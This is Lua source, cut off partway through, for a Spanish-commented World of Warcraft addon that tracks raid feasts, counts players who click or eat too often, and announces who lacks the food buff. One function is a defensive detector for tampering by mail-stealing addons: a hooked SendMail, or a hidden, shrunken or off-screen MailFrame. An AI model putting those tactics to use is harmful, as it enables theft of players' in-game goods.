-- Gordito v2.3 - Protege tus festines
-- Autor: Zorrorojo/miabuelita (guild Sedentarios)

local f = CreateFrame("Frame")

-- ====== SISTEMA DE TEMPORIZADORES SEGURO (SIN FUGAS DE MEMORIA) ======
local GorditoTimerFrame = CreateFrame("Frame")
local activeTimers = {}

GorditoTimerFrame:SetScript("OnUpdate", function(self, delta)
    for key, timerData in pairs(activeTimers) do
        timerData.elapsed = timerData.elapsed + delta
        if timerData.elapsed >= timerData.duration then
            local cb = timerData.callback
            activeTimers[key] = nil
            cb()
        end
    end
end)

local function SetGorditoTimer(key, duration, callback)
    activeTimers[key] = {
        elapsed = 0,
        duration = duration,
        callback = callback
    }
end

-- ====== CONFIGURACION ======
local FEAST_NAMES = {
    ["Festín de pescado"]=true, ["Fish Feast"]=true,
    ["Gran festín"]=true,       ["Great Feast"]=true,
}
local FOOD_AURA_IDS = {
    [45548]=true, -- Comida (Aura mientras come)
    [57073]=true, -- Festín (Aura mientras come/bebe)
    [430]=true,   -- Comida básica
}
local DRINK_AURA_IDS = {
    [57073]=true, -- Festín (Aura mientras come/bebe)
    [431]=true,   -- Bebida básica
    [42956]=true, -- Agua de mago (Nivel 80)
}
-- IDs de bufo final (1 hora) para proteccion
local WELL_FED_IDS = { 
    [57294]=true, [57371]=true, [57139]=true, [57399]=true, 
    [57325]=true, [57327]=true, [57329]=true, [57332]=true,
    [57334]=true, [57356]=true, [57358]=true, [57360]=true,
    [57363]=true, [57365]=true, [57367]=true, [57373]=true,
}
local FEAST_PLACE_IDS = { [57426]=true, [66476]=true, [66477]=true }
local FOOD_CAST_NAMES = {
    ["Alimentándose"]=true, ["Food"]=true, ["Eating"]=true, ["Comiendo"]=true,
    ["Festín de pescado"]=true, ["Fish Feast"]=true,
    ["Gran festín"]=true,       ["Great Feast"]=true,
}
local DRINK_CAST_NAMES = {
    ["Beber"]=true, ["Drink"]=true, ["Bebiendo"]=true,
}
local FEAST_CLICK_IDS = {
    [57337] = true, -- Gran festin (Click)
    [57073] = true, -- Fish Feast (Click/Aura)
    [57397] = true, -- Fish Feast (Click - Festín de pescado)
}
local GENERIC_FOOD_NAMES = {
    ["Alimentándose"]=true, ["Food"]=true, ["Eating"]=true, ["Comiendo"]=true,
    ["Beber"]=true, ["Drink"]=true, ["Bebiendo"]=true,
    ["Bizcocho de maná"]=true, ["Mana Strudel"]=true,
    ["Refrigerio"]=true, ["Refreshment"]=true,
    ["Refresco"]=true, ["Ritual de refrigerio"]=true,
}
local MIN_BUFF_DURATION = 30
local ANNOUNCE_COOLDOWN = 8
local debugMode = true  -- ACTIVADO POR DEFECTO PARA PRUEBAS

-- Tooltips para la UI
local TOOLTIPS = {
    enabled = "Activa o desactiva TODA la protección del addon.",
    announce = "Permite enviar avisos automáticos al grupo/banda.",
    CHAT = "Envía avisos por el canal de grupo o banda.",
    ALERTA = "Envía alertas de banda (solo si eres líder o ayudante).",
    SAY = "El personaje dirá el aviso en voz alta.",
    GLOTON = "Muestra y avisa sobre personas que dan demasiados clics o comen de más.",
    clickLow = "Número de clics para el primer aviso (amarillo).",
    clickHigh = "Número de clics/comidas para la alerta roja (STOP).",
    startingDebounce = "Segundos para ignorar otros avisos cuando alguien empieza a poner un festín.",
    announceCooldown = "Segundos de espera entre gritos globales para evitar spam.",
}

-- ====== CONFIGURACION DEFAULT ======
local DEFAULT_SETTINGS = {
    enabled = true,
    announce = true,
    warnModes = { ["CHAT"] = true, ["ALERTA"] = true, ["SAY"] = false, ["GLOTON"] = true },
    clickLow = 2,
    clickHigh = 5,
    startingDebounce = 7,
    announceCooldown = 8,
    msgLow = "[Gordito] %n: %c CLICS AL FESTIN!",
    msgHigh = "[Gordito] %n PARA DE DAR CLICK!!! (comiste %c veces)",
    feastDuration = 300,
    minimapPos = 45,
}

-- ====== ESTADO ======
local lastAnnounce   = 0
local lastPlacer     = "Nadie aun"
local eatCounts      = {}  -- veces que alguien completo comer (buff aplicado)
local clickCounts    = {}  -- veces que alguien INICIO el cast de comer (cada clic)
local totalEats      = 0
local totalClicks    = 0
local lastPlacedTime = 0
local lastStartingTime = 0
local auraLostTime   = {}
local personLastAnnounce = {} -- Cooldown por persona para evitar spam excesivo pero permitir avisos seguidos
local personLastClick    = {} -- Cooldown para conteo de clics
local personLastEat      = {} -- Cooldown para conteo de comidas
local otherGorditos = {} -- [Nombre] = Rango
local isTradeSkillName = {} -- [Nombre lower] = true si esta cocinando
local expectingFeast = {} -- [Nombre lower] = true si empezo a poner uno real
local lastCastDuration = {} -- [Nombre] = segundos de duracion del ultimo cast detectado

local function IsActive()
    if not GorditoDB or not GorditoDB.enabled then return false end
    if InCombatLockdown() then return false end
    -- Solo activo en grupo/banda (o modo debug para pruebas)
    if GetNumRaidMembers() == 0 and GetNumPartyMembers() == 0 and not debugMode then return false end
    return true
end

local function GetFeastBagSummary()
    local fishFeastCount = 0
    local greatFeastCount = 0
    
    for bag = 0, 4 do
        local numSlots = GetContainerNumSlots(bag)
        if numSlots and numSlots > 0 then
            for slot = 1, numSlots do
                local itemLink = GetContainerItemLink(bag, slot)
                if itemLink then
                    local itemId = tonumber(string.match(itemLink, "item:(%d+)"))
                    if itemId == 43268 or itemId == 34753 then
                        local _, itemCount = GetContainerItemInfo(bag, slot)
                        itemCount = itemCount or 1
                        if itemId == 43268 then
                            fishFeastCount = fishFeastCount + itemCount
                        else
                            greatFeastCount = greatFeastCount + itemCount
                        end
                    end
                end
            end
        end
    end
    
    local summary = ""
    if fishFeastCount > 0 then
        summary = summary .. "\n- Festines de pescado en bolsa: " .. fishFeastCount
    end
    if greatFeastCount > 0 then
        summary = summary .. "\n- Grandes festines en bolsa: " .. greatFeastCount
    end
    if summary == "" then
        summary = "\n- No tienes festines en tus bolsas."
    end
    return summary
end

local function AuditMailboxIntegrity()
    -- 1. Verificar si la función SendMail ha sido suplantada/hookeada usando issecurevariable (el método oficial de Blizzard)
    -- En WoW 3.3.5a, tostring(SendMail) no distingue entre C y Lua, por lo que issecurevariable es el método 100% libre de falsos positivos.
    if not issecurevariable("SendMail") then
        return false, "Función SendMail interceptada o modificada por otro addon."
    end

    -- 2. Verificar la integridad física de MailFrame
    if MailFrame and MailFrame:IsShown() then
        local alpha = MailFrame:GetAlpha() or 1
        local scale = MailFrame:GetScale() or 1
        local left = MailFrame:GetLeft()
        local top = MailFrame:GetTop()

        if alpha < 0.1 then
            return false, "El buzón está invisible (Alpha < 0.1)."
        end
        if scale < 0.1 then
            return false, "El buzón ha sido encogido (Scale < 0.1)."
        end
        
        -- Obtener dimensiones de pantalla de forma dinámica
        local screenWidth = GetScreenWidth() or 1920
        local screenHeight = GetScreenHeight() or 1080
        
        -- Usamos umbrales muy generosos (500px) para evitar falsos positivos con escalas de interfaz de Blizzard
        if left and (left < -500 or left > screenWidth + 500) then
            return false, "El buzón está desplazado fuera de la pantalla horizontalmente."
        end
        if top and (top < -500 or top > screenHeight + 500) then
            return false, "El buzón está desplazado fuera de la pantalla verticalmente."
        end
    end

    return true, "Integridad de buzón verificada y segura."
end

-- Sincronizacion
local ADDON_PREFIX = "GorditoV2"
local GORDITO_VERSION = "2.3 R"
local otherVersions = {}

local function SendVersion()
    local msg = "V:" .. GORDITO_VERSION
    if IsInRaid() then SendAddonMessage(ADDON_PREFIX, msg, "RAID")
    elseif GetNumPartyMembers() > 0 then SendAddonMessage(ADDON_PREFIX, msg, "PARTY") end
end

local function RequestVersions()
    for k in pairs(otherVersions) do otherVersions[k] = nil end -- Limpiar cache
    local msg = "V:REQ"
    if IsInRaid() then SendAddonMessage(ADDON_PREFIX, msg, "RAID")
    elseif GetNumPartyMembers() > 0 then SendAddonMessage(ADDON_PREFIX, msg, "PARTY") end
    print("|cff00ff00Gordito|r: Solicitando versiones al grupo...")
    
    -- Reporte diferido utilizando el temporizador global reciclable
    SetGorditoTimer("VersionReport", 2.0, function()
        print("|cff00ff00Gordito - Reporte de Versiones:|r")
        print("- " .. UnitName("player") .. ": |cffffffff" .. GORDITO_VERSION .. "|r (Tu)")
        local count = 0
        for name, ver in pairs(otherVersions) do
            print("- " .. name .. ": |cffffffff" .. ver .. "|r")
            count = count + 1
        end
        if count == 0 then
            print("No se detectaron otros usuarios con Gordito.")
        end
    end)
end
local function UpdateGorditos()
    -- Limpieza de gente que ya no esta
    local current = {}
    if IsInRaid() then
        for i=1, GetNumRaidMembers() do
            local name = GetRaidRosterInfo(i); if name then current[name] = true end
        end
    elseif GetNumPartyMembers() > 0 then
        current[UnitName("player")] = true
        for i=1, GetNumPartyMembers() do
            local name = UnitName("party"..i); if name then current[name] = true end
        end
    end
    for name in pairs(otherGorditos) do
        if not current[name] then otherGorditos[name] = nil end
    end
end

local function IsResponsible()
    if not GorditoDB or not GorditoDB.announce then return false end
    local inRaid = IsInRaid()
    local inParty = GetNumPartyMembers() > 0 or inRaid
    if not inParty then return true end
    
    local myName = UnitName("player")
    local myRank = (IsRaidLeader() and 2) or (IsRaidOfficer() and 1) or 0
    
    UpdateGorditos()
    for name, rank in pairs(otherGorditos) do
        if rank > myRank then return false end
        if rank == myRank and name < myName then return false end
    end
    return true
end

local function SendPing()
    local rank = (IsRaidLeader() and 2) or (IsRaidOfficer() and 1) or 0
    local msg = "P:" .. rank
    if IsInRaid() then SendAddonMessage(ADDON_PREFIX, msg, "RAID")
    elseif GetNumPartyMembers() > 0 then SendAddonMessage(ADDON_PREFIX, msg, "PARTY") end
end

-- Nueva funcion para obtener todos los canales activos
local function GetActiveChannels()
    local channels = {}
    
    local inRaid = IsInRaid()
    local inParty = GetNumPartyMembers() > 0 or inRaid

    local function addChannel(c)
        for _, v in ipairs(channels) do if v == c then return end end
        table.insert(channels, c)
    end

    if GorditoDB.warnModes["ALERTA"] and inRaid then
        if IsRaidLeader() or IsRaidOfficer() then
            addChannel("RAID_WARNING")
        else
            addChannel("RAID")
        end
    end
    if GorditoDB.warnModes["CHAT"] then
        addChannel(inRaid and "RAID" or (inParty and "PARTY" or "SAY"))
    end
    if GorditoDB.warnModes["SAY"] then
        addChannel("SAY")
    end
    
    return channels
end

-- ====== EVENTOS ======
f:RegisterEvent("PLAYER_LOGIN")
f:RegisterEvent("UNIT_SPELLCAST_START")   -- proteccion propia
f:RegisterEvent("UNIT_SPELLCAST_SUCCEEDED") -- deteccion de placement (alternativa a CLEU)
f:RegisterEvent("COMBAT_LOG_EVENT_UNFILTERED")
f:RegisterEvent("CHAT_MSG_RAID")
f:RegisterEvent("CHAT_MSG_RAID_LEADER")
f:RegisterEvent("CHAT_MSG_PARTY")
f:RegisterEvent("CHAT_MSG_SAY")
f:RegisterEvent("RAID_ROSTER_UPDATE")
f:RegisterEvent("PARTY_MEMBERS_CHANGED")
f:RegisterEvent("CHAT_MSG_ADDON")
f:RegisterEvent("UNIT_SPELLCAST_STOP")
f:RegisterEvent("UNIT_SPELLCAST_FAILED")
f:RegisterEvent("UNIT_SPELLCAST_INTERRUPTED")
f:RegisterEvent("MAIL_SHOW")

-- ====== SCAN DE BUFFS ======
local function CheckUnitBuffs(unit)
    for i = 1, 40 do
        local name, _, _, _, _, _, _, _, _, _, spellId = UnitAura(unit, i)
        if not name then break end
        
        -- 1. Verificar si ya tiene el bufo de 1 hora
        if WELL_FED_IDS[spellId] then return true end
        
        -- 2. Verificar si está COMIENDO en este momento
        if FOOD_AURA_IDS[spellId] or FOOD_CAST_NAMES[name] then return true end
    end
    return false
end

local function ScanForMissing()
    if not IsActive() then return {}, 0 end
    local missing, total = {}, 0

    local function Evaluate(unit)
        local name = UnitName(unit)
        if not name or name == "Unknown" then return end
        total = total + 1
        local hasFood = CheckUnitBuffs(unit)
        
        if not hasFood then
            table.insert(missing, name .. " (Comida)")
        end
    end

    if IsInRaid() then
        for i = 1, GetNumRaidMembers() do Evaluate("raid"..i) end
    elseif GetNumPartyMembers() > 0 then
        Evaluate("player")
        for i = 1, GetNumPartyMembers() do Evaluate("party"..i) end
    end
    
    table.sort(missing)
    return missing, total
end

local function SendMissingToChannel(channel)
    local missing, total = ScanForMissing()
    if #missing == 0 then
        SendChatMessage("[Gordito] ¡Todos listos! Food/Drink OK ("..total.."/"..total..")", channel)
        return
    end
    local header = "[Gordito] Faltan ("..#missing.."/"..total.."): "
    local chunk  = header
    for i, info in ipairs(missing) do
        local sep = (i < #missing) and ", " or "."
        local add = info..sep
        if (#chunk + #add) > 250 then
            SendChatMessage(chunk, channel)
            chunk = "[Gordito] ..." .. add
        else
            chunk = chunk..add
        end
    end
    if #chunk > 0 then SendChatMessage(chunk, channel) end
end

-- ====== FORWARD DECLARATIONS ======
local UpdateUI, UpdateMissingList, UpdateMinimapIcon
local mainFrame, statusText, placerText, statsText, toggleBtn
local missingHeaderText, scrollFrame, scrollChild, scrollBar
local missingRows = {}

-- ====== VENTANA PRINCIPAL (270x480, layout Y absolutos desde TOP) ======
mainFrame = CreateFrame("Frame", "GorditoMainFrame", UIParent)
mainFrame:SetSize(560, 500)
mainFrame:SetPoint("CENTER", UIParent, "CENTER", 0, 50)
tinsert(UISpecialFrames, "GorditoMainFrame") -- Permite cerrar con ESC
mainFrame:SetMovable(true)
mainFrame:EnableMouse(true)
mainFrame:RegisterForDrag("LeftButton")
mainFrame:SetScript("OnDragStart", mainFrame.StartMoving)
mainFrame:SetScript("OnDragStop",  mainFrame.StopMovingOrSizing)
mainFrame:SetFrameStrata("MEDIUM")
mainFrame:Hide()

-- En WotLK 3.3.5 se usa SetBackdrop() en vez de templates
mainFrame:SetBackdrop({
    bgFile   = "Interface\\DialogFrame\\UI-DialogBox-Background",
    edgeFile = "Interface\\DialogFrame\\UI-DialogBox-Border",
    tile     = true, tileSize = 32, edgeSize = 32,
    insets   = { left = 11, right = 12, top = 12, bottom = 11 }
})

local titleBar = mainFrame:CreateTexture(nil, "ARTWORK")
titleBar:SetTexture("Interface\\DialogFrame\\UI-DialogBox-Header")
titleBar:SetWidth(290); titleBar:SetHeight(64)
titleBar:SetPoint("TOP", 0, 12)

local titleText = mainFrame:CreateFontString(nil, "OVERLAY", "GameFontNormal")
titleText:SetPoint("TOP", mainFrame, "TOP", 0, -5)
titleText:SetText("|cff00ff00Gordito|r - Festines")

local closeBtn = CreateFrame("Button", nil, mainFrame, "UIPanelCloseButton")
closeBtn:SetPoint("TOPRIGHT", mainFrame, "TOPRIGHT", -3, -3)
closeBtn:SetScript("OnClick", function() mainFrame:Hide() end)

-- Seccion superior: Y absolutos desde TOP del frame
-- y=-28: Estado
-- Seccion superior Izquierda
statusText = mainFrame:CreateFontString(nil, "OVERLAY", "GameFontNormal")
statusText:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", 20, -35)
statusText:SetWidth(240); statusText:SetJustifyH("LEFT")

placerText = mainFrame:CreateFontString(nil, "OVERLAY", "GameFontNormalSmall")
placerText:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", 20, -55)
placerText:SetWidth(240); placerText:SetJustifyH("LEFT")

statsText = mainFrame:CreateFontString(nil, "OVERLAY", "GameFontNormalSmall")
statsText:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", 20, -70)
statsText:SetWidth(240); statsText:SetJustifyH("LEFT")

toggleBtn = CreateFrame("Button", "GorditoToggleButton", mainFrame, "GameMenuButtonTemplate")
toggleBtn:SetSize(240, 24)
toggleBtn:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", 20, -90)
toggleBtn:SetScript("OnClick", function()
    if not GorditoDB then return end
    GorditoDB.enabled = not GorditoDB.enabled
    UpdateMinimapIcon()
    UpdateUI() -- Esto debería refrescar el texto inmediatamente
    local estado = GorditoDB.enabled and "|cff00ff00ACTIVADA|r" or "|cffff0000DESACTIVADA|r"
    print("|cff00ff00Gordito|r: Protección " .. estado)
end)

-- Contenedor para las 3 opciones con palomita (CheckButtons)
local checkButtons = {}
local function CreateWarnCheck(id, text, xOff)
    -- Crear el cuadro de la palomita
    local cb = CreateFrame("CheckButton", "GorditoCheck_"..id, mainFrame, "InterfaceOptionsCheckButtonTemplate")
    cb:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", xOff, -108)
    cb:SetSize(26, 26) -- Forzamos tamaño cuadrado
    
    -- REDUCIR AREA DE CLIC: Evita que el area invisible a la derecha tape otros botones
    -- El 4to parametro de SetHitRectInsets recorta el area clickeable desde la derecha
    cb:SetHitRectInsets(0, 0, 0, 0) 
    cb:SetWidth(26) -- Asegura que el ancho sea solo el del cuadro

    -- Ocultamos el texto interno del boton para que no sea clickeable
    local internalText = _G[cb:GetName().."Text"]
    if internalText then 
        internalText:SetText("") 
        internalText:Hide()
    end
    
    -- Creamos un texto independiente (no clickeable) al lado
    local label = mainFrame:CreateFontString(nil, "OVERLAY", "GameFontNormalSmall")
    label:SetPoint("LEFT", cb, "RIGHT", 0, 1)
    label:SetText(text)

    cb:SetScript("OnEnter", function(self)
        if TOOLTIPS[id] then
            GameTooltip:SetOwner(self, "ANCHOR_RIGHT")
            GameTooltip:SetText(TOOLTIPS[id], 1, 1, 1, 1, true)
            GameTooltip:Show()
        end
    end)
    cb:SetScript("OnLeave", function() GameTooltip:Hide() end)

    cb:SetScript("OnClick", function(self)
        if not GorditoDB or not GorditoDB.warnModes then return end
        if id == "checkDrink" then
            GorditoDB.checkDrink = self:GetChecked()
        else
            GorditoDB.warnModes[id] = self:GetChecked()
        end
        local color = (id == "ALERTA") and "|cffff4400" or (id == "SAY" and "|cffffff00" or "|cff00ffff")
        local estado = self:GetChecked() and "|cff00ff00ON|r" or "|cffff0000OFF|r"
        print("|cff00ff00Gordito|r: "..color..id.."|r está ahora "..estado)
        UpdateUI()
    end)
    checkButtons[id] = cb
end

CreateWarnCheck("CHAT", "Banda", 20)
CreateWarnCheck("ALERTA", "Alerta", 85)
CreateWarnCheck("SAY", "Decir", 150)
CreateWarnCheck("GLOTON", "Glotón", 215)


-- Separador Vertical
local vDiv = mainFrame:CreateTexture(nil, "ARTWORK")
vDiv:SetTexture("Interface\\Common\\UI-TooltipDivider-Transparent")
vDiv:SetSize(460, 2)
vDiv:SetPoint("CENTER", mainFrame, "LEFT", 280, 0)
vDiv:SetRotation(math.pi / 2)
vDiv:SetAlpha(0.6)

-- y=-160: Divisor 1
local div1 = mainFrame:CreateTexture(nil, "ARTWORK")
div1:SetTexture("Interface\\Common\\UI-TooltipDivider-Transparent")
div1:SetSize(250, 16)
div1:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", 15, -160)


-- Seccion de Configuracion de Clics y Tiempos
local function CreateClickInput(labelStr, dbKey, x, y, width)
    local lbl = mainFrame:CreateFontString(nil, "OVERLAY", "GameFontNormalSmall")
    lbl:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", x, y)
    lbl:SetText(labelStr)

    local eb = CreateFrame("EditBox", "GorditoEB_"..dbKey, mainFrame, "InputBoxTemplate")
    eb:SetSize(width or 25, 18)
    eb:SetPoint("LEFT", lbl, "RIGHT", 5, 0)
    eb:SetAutoFocus(false)
    eb:SetNumeric(true)
    eb:SetMaxLetters(3)
    eb:SetScript("OnTextChanged", function(self)
        if GorditoDB then GorditoDB[dbKey] = tonumber(self:GetText()) or 1 end
    end)
    eb:SetScript("OnEnterPressed", function(self) self:ClearFocus() end)
    eb:SetScript("OnEscapePressed", function(self) self:ClearFocus() end)
    return eb
end

-- y=-145: Umbrales de clics
-- y=-180: Umbrales
clickLowEB  = CreateClickInput("Aviso:", "clickLow", 20, -185, 25)
clickHighEB = CreateClickInput("Alerta:", "clickHigh", 155, -185, 25)

-- y=-210: Tiempos
debounceEB  = CreateClickInput("Poner(s):", "startingDebounce", 20, -210, 30)
announceCooldownEB = CreateClickInput("Grito(s):", "announceCooldown", 155, -210, 30)


-- Editores de Texto para los anuncios
local function CreateTextInput(labelStr, dbKey, xOff, yOff)
    local lbl = mainFrame:CreateFontString(nil, "OVERLAY", "GameFontNormalSmall")
    lbl:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", xOff, yOff)
    lbl:SetText(labelStr)

    local eb = CreateFrame("EditBox", "GorditoEB_"..dbKey, mainFrame, "InputBoxTemplate")
    eb:SetSize(240, 20)
    eb:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", xOff, yOff - 15)
    eb:SetAutoFocus(false)
    eb:SetScript("OnEditFocusLost", function(self)
        if GorditoDB then GorditoDB[dbKey] = self:GetText() end
    end)
    eb:SetScript("OnEnterPressed", function(self) 
        if GorditoDB then GorditoDB[dbKey] = self:GetText() end
        self:ClearFocus() 
    end)
    eb:SetScript("OnEscapePressed", function(self) self:ClearFocus() end)
    eb:SetScript("OnEnter", function(self)
        if TOOLTIPS[dbKey] then
            GameTooltip:SetOwner(self, "ANCHOR_RIGHT")
            GameTooltip:SetText(TOOLTIPS[dbKey], 1, 1, 1, 1, true)
            GameTooltip:Show()
        end
    end)
    eb:SetScript("OnLeave", function() GameTooltip:Hide() end)
    return eb
end

msgLowEB  = CreateTextInput("Mensaje Aviso (%n=nombre):", "msgLow", 20, -265)
msgHighEB = CreateTextInput("Mensaje Alerta (%n=nombre):", "msgHigh", 20, -325)

-- Slider de Duración del Festín (Seguimiento)
local function CreateGorditoSlider(labelStr, dbKey, x, y, minVal, maxVal)
    local slider = CreateFrame("Slider", "GorditoSlider_"..dbKey, mainFrame, "OptionsSliderTemplate")
    slider:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", x, y)
    slider:SetWidth(240)
    slider:SetHeight(17)
    slider:SetMinMaxValues(minVal, maxVal)
    slider:SetValueStep(10)
    
    _G[slider:GetName().."Low"]:SetText(minVal.."s")
    _G[slider:GetName().."High"]:SetText(maxVal.."s")
    
    slider:SetScript("OnValueChanged", function(self, value)
        value = math.floor(value)
        if GorditoDB then GorditoDB[dbKey] = value end
        _G[self:GetName().."Text"]:SetText(labelStr .. ": " .. value .. "s")
    end)
    return slider
end

feastDurationSlider = CreateGorditoSlider("Segs. Seguimiento", "feastDuration", 20, -400, 30, 600)


-- Seccion inferior
-- y=-290: Header "Faltan comer"
-- y=-320: Headers de las listas
greedyHeaderText = mainFrame:CreateFontString(nil, "OVERLAY", "GameFontNormal")
greedyHeaderText:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", 295, -35)
greedyHeaderText:SetText("|cffff4400Glotones y Clics:|r")

-- Boton Limpiar Glotones
local btnClearGreedy = CreateFrame("Button", "GorditoClearGreedy", mainFrame, "GameMenuButtonTemplate")
btnClearGreedy:SetSize(60, 20)
btnClearGreedy:SetPoint("TOPRIGHT", mainFrame, "TOPLEFT", 535, -32)
btnClearGreedy:SetText("Clear")
btnClearGreedy:SetNormalFontObject("GameFontNormalSmall")
btnClearGreedy:SetScript("OnClick", function()
    eatCounts = {}; clickCounts = {}
    UpdateUI()
    print("|cff00ff00Gordito|r: Lista de glotones limpia.")
end)


missingHeaderText = mainFrame:CreateFontString(nil, "OVERLAY", "GameFontNormal")
missingHeaderText:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", 295, -245)
missingHeaderText:SetText("|cffffff00Faltan comer:|r")

-- Boton Rastrear (al lado de Faltan comer)
local btnTrack = CreateFrame("Button", "GorditoTrackMissing", mainFrame, "GameMenuButtonTemplate")
btnTrack:SetSize(80, 22)
btnTrack:SetPoint("TOPRIGHT", mainFrame, "TOPRIGHT", -25, -242)
btnTrack:SetText("Rastrear")
btnTrack:SetScript("OnClick", function()
    UpdateMissingList()
    print("|cff00ff00Gordito|r: Lista de faltantes actualizada.")
end)

-- Botones (Al pie de la derecha)
local btnChatBanda = CreateFrame("Button", "GorditoAnnounceBanda", mainFrame, "GameMenuButtonTemplate")
btnChatBanda:SetSize(115, 22)
btnChatBanda:SetPoint("TOPLEFT", mainFrame, "TOPLEFT", 295, -465)
btnChatBanda:SetText("Chat Banda")
btnChatBanda:SetScript("OnClick", function()
    if not IsInRaid() and GetNumPartyMembers() == 0 then
        print("|cff00ff00Gordito|r: No estas en grupo."); return
    end
    SendMissingToChannel(IsInRaid() and "RAID" or "PARTY")
end)

local btnAlertaBanda = CreateFrame("Button", "GorditoAnnounceAlerta", mainFrame, "GameMenuButtonTemplate")
btnAlertaBanda:SetSize(115, 22)
btnAlertaBanda:SetPoint("LEFT", btnChatBanda, "RIGHT", 10, 0)
btnAlertaBanda:SetText("Alerta de Banda")
btnAlertaBanda:SetScript("OnClick", function()
    if not IsInRaid() then
        print("|cff00ff00Gordito|r: Debes estar en banda."); return
    end
    if not IsRaidLeader() and not IsRaidOfficer() then
        print("|cff00ff00Gordito|r: Solo lider/oficial puede enviar Alerta de Banda."); return
    end
    SendMissingToChannel("RAID_WARNING")
end)

-- Boton Reset
local btnReset = CreateFrame("Button", "GorditoReset", mainFrame, "GameMenuButtonTemplate")
btnReset:SetSize(80, 22)
btnReset:SetPoint("BOTTOMLEFT", mainFrame, "BOTTOMLEFT", 15, 12)
btnReset:SetText("Reset")
btnReset:SetScript("OnClick", function()
    if GorditoDB then
        for k, v in pairs(DEFAULT_SETTINGS) do
            if type(v) == "table" then
                GorditoDB[k] = {}
                for k2, v2 in pairs(v) do GorditoDB[k][k2] = v2 end
            else
                GorditoDB[k] = v
            end
        end
        print("|cff00ff00Gordito|r: Valores reseteados a defecto.")
        UpdateUI()
    end
end)

-- Listas
-- Lista 2: Glotones (Derecha, Mitad Superior)
greedyScroll = CreateFrame("ScrollFrame", "GorditoGreedyScroll", mainFrame)
greedyScroll:SetPoint("TOPLEFT",     mainFrame, "TOPLEFT",     295, -60)
greedyScroll:SetPoint("BOTTOMRIGHT", mainFrame, "TOPLEFT",     535, -235)

greedyScrollChild = CreateFrame("Frame")
greedyScrollChild:SetSize(210, 1)
greedyScroll:SetScrollChild(greedyScrollChild)

local greedyRows = {}
for i = 1, 40 do
    local row = greedyScrollChild:CreateFontString(nil, "OVERLAY", "GameFontNormalSmall")
    row:SetPoint("TOPLEFT", greedyScrollChild, "TOPLEFT", 4, -(i-1)*16)
    row:SetWidth(200); row:SetJustifyH("LEFT"); row:Hide()
    greedyRows[i] = row
end

greedyScrollBar = CreateFrame("Slider", "GorditoGreedyScrollBar", mainFrame, "UIPanelScrollBarTemplate")
greedyScrollBar:SetPoint("TOPLEFT",    greedyScroll, "TOPRIGHT",    4, -16)
greedyScrollBar:SetPoint("BOTTOMLEFT", greedyScroll, "BOTTOMRIGHT", 4,  16)
greedyScrollBar:SetMinMaxValues(0, 1); greedyScrollBar:SetValueStep(1)
greedyScrollBar:SetScript("OnValueChanged", function(self, val)
    if greedyScroll then greedyScroll:SetVerticalScroll(val * 16) end
end)
greedyScrollBar:SetValue(0)
greedyScroll:SetScript("OnMouseWheel", function(self, delta)
    local mn, mx = greedyScrollBar:GetMinMaxValues()
    greedyScrollBar:SetValue(math.max(mn, math.min(mx, greedyScrollBar:GetValue() - delta)))
end)

-- Lista 1: Faltan Comer (Derecha, Mitad Inferior)
scrollFrame = CreateFrame("ScrollFrame", "GorditoScrollFrame", mainFrame)
scrollFrame:SetPoint("TOPLEFT",     mainFrame, "TOPLEFT",     295, -270)
scrollFrame:SetPoint("BOTTOMRIGHT", mainFrame, "TOPLEFT",     535, -455)

scrollChild = CreateFrame("Frame")
scrollChild:SetSize(210, 1)
scrollFrame:SetScrollChild(scrollChild)

for i = 1, 40 do
    local row = scrollChild:CreateFontString(nil, "OVERLAY", "GameFontNormalSmall")
    row:SetPoint("TOPLEFT", scrollChild, "TOPLEFT", 4, -(i-1)*16)
    row:SetWidth(200); row:SetJustifyH("LEFT"); row:Hide()
    missingRows[i] = row
end

scrollBar = CreateFrame("Slider", "GorditoScrollBar", mainFrame, "UIPanelScrollBarTemplate")
scrollBar:SetPoint("TOPLEFT",    scrollFrame, "TOPRIGHT",    4, -16)
scrollBar:SetPoint("BOTTOMLEFT", scrollFrame, "BOTTOMRIGHT", 4,  16)
scrollBar:SetMinMaxValues(0, 1); scrollBar:SetValueStep(1)
scrollBar:SetScript("OnValueChanged", function(self, val)
    if scrollFrame then scrollFrame:SetVerticalScroll(val * 16) end
end)
scrollBar:SetValue(0)
scrollFrame:SetScript("OnMouseWheel", function(self, delta)
    local mn, mx = scrollBar:GetMinMaxValues()
    scrollBar:SetValue(math.max(mn, math.min(mx, scrollBar:GetValue() - delta)))
end)

-- ====== FUNCIONES UI ======
UpdateMissingList = function()
    local missing, total = ScanForMissing()
    local count = #missing
    missingHeaderText:SetText("|cffffff00Faltan ("..count.."/"..total.."):|r")
    for i = 1, 40 do
        if i <= count then
            missingRows[i]:SetText("|cffff6060• "..missing[i].."|r"); missingRows[i]:Show()
        else
            missingRows[i]:Hide()
        end
    end
    scrollChild:SetHeight(math.max(1, count * 16))
    local mx = math.max(0, count - 10)
    scrollBar:SetMinMaxValues(0, mx); scrollBar:SetValue(math.min(scrollBar:GetValue(), mx))
    if mx > 0 then scrollBar:Show() else scrollBar:Hide() end
end

local function UpdateGreedyList()
    local entries = {}
    for name, n in pairs(clickCounts) do
        if n > 1 then table.insert(entries, "|cffff8800• "..name.."|r ("..n.." clics)") end
    end
    for name, n in pairs(eatCounts) do
        if n > 1 then table.insert(entries, "|cffff4400• "..name.."|r ("..n.." comidas)") end
    end
    local count = #entries
    greedyHeaderText:SetText("|cffff4400Glotones ("..count.."):|r")
    for i = 1, 40 do
        if i <= count then
            greedyRows[i]:SetText(entries[i]); greedyRows[i]:Show()
        else
            greedyRows[i]:Hide()
        end
    end
    greedyScrollChild:SetHeight(math.max(1, count * 16))
    local mx = math.max(0, count - 10)
    greedyScrollBar:SetMinMaxValues(0, mx); greedyScrollBar:SetValue(math.min(greedyScrollBar:GetValue(), mx))
    if mx > 0 then greedyScrollBar:Show() else greedyScrollBar:Hide() end
end

UpdateUI = function()
    if not GorditoDB then return end
    if GorditoDB.enabled then
